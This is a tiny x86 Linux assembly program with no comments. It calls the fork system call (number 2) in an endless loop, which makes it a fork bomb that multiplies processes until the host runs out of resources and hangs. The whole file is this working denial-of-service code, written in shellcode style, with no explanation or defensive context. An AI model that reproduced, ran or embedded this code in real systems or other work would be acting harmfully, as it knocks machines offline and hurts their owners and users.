global _start

section .text

_start:
	xor eax, eax
	mov al, 0x2	
	int 0x80
	jmp short _start
